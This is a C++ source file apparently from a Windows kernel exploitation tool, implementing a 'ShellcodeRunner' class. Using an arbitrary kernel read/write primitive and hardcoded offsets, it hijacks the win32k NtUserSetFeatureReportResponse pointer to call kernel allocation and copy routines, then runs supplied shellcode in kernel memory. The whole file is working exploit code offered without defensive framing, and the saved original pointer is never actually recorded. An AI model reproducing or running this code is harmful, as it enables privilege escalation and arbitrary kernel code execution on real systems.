#include <windows.h>
#include <WinUser.h>
#include <Psapi.h>

#include <iostream>
#include <stdexcept>
#include <array>

#include "RunShellcode.h"
#include "Utils.h"

/*
	Yeah this isn't portable
	sue me
*/
constexpr ULONG NtUserSetFeatureReportResponseOffset = 0x1C02446C0;
constexpr ULONG ExAllocatePoolWithTagOffset = 0x9B5030;
constexpr ULONG MemoveOffset = 0x40F440;

ShellcodeRunner::ShellcodeRunner(KernelReadWrite& ReadWrite) : rw(std::move(ReadWrite)), originalFunction(0), win32kBase(0), NtUserSetFeatureReportResponse(nullptr) {
	auto bases = PeUtils::GetKernelModuleAddresses();
	kernelBase = std::get<0>(bases);
	win32kBase = std::get<1>(bases);

	if (win32kBase == 0 || kernelBase == 0) {
		throw std::runtime_error("couldn't find win32kbase.sys base address");
	}
	auto win32User = LoadLibrary(L"win32u.dll");
	if (win32User == 0) {
		throw std::runtime_error("couldn't load win32u.dll");
	}
	std::cout << "Found kernel base at " << std::hex << kernelBase << " and win32k.sys base at " << win32kBase << std::endl;
	this->NtUserSetFeatureReportResponse = (NtUserSetFeatureReportResponse_t)GetProcAddress(win32User, "NtUserSetFeatureReportResponse");
	if (NtUserSetFeatureReportResponse == nullptr) {
		throw std::runtime_error("couldn't find NtUserSetFeatureReportResponse");
	}
	std::cout << "Found NtUserSetFeatureReportResponse at " << std::hex << this->NtUserSetFeatureReportResponse << std::endl;
}

#define PagedPool 1

VOID ShellcodeRunner::RunShellcode(const PVOID Shellcode, ULONG ShellcodeLength,
	ULONG64 Param1, ULONG64 Param2, ULONG32 Param3) {
	auto executableBuffer = reinterpret_cast<ULONG64>(this->CopyToPool(Shellcode, ShellcodeLength));
	// run shellcode
	RunFunction(executableBuffer, Param1, Param2, Param3);
}

ULONG64 ShellcodeRunner::RunFunction(ULONG64 NewPointer, ULONG64 Param1, ULONG64 Param2, ULONG32 Param3) {
	rw.WriteQword(win32kBase + NtUserSetFeatureReportResponseOffset, reinterpret_cast<PVOID>(NewPointer));
	return NtUserSetFeatureReportResponse(Param1, Param2, Param3);
}

PVOID ShellcodeRunner::CopyToPool(const PVOID Source, ULONG Size) {
	// allocate executable buffer
	auto executableBuffer = RunFunction(kernelBase + ExAllocatePoolWithTagOffset, PagedPool, Size, 'Ndis');
	// copy shellcode to executable buffer
	RunFunction(kernelBase + MemoveOffset, executableBuffer, reinterpret_cast<ULONG64>(Source), Size);
	return reinterpret_cast<PVOID>(executableBuffer);
}

ShellcodeRunner::~ShellcodeRunner() {
	rw.WriteQword(win32kBase + NtUserSetFeatureReportResponseOffset, reinterpret_cast<PVOID>(originalFunction));
}
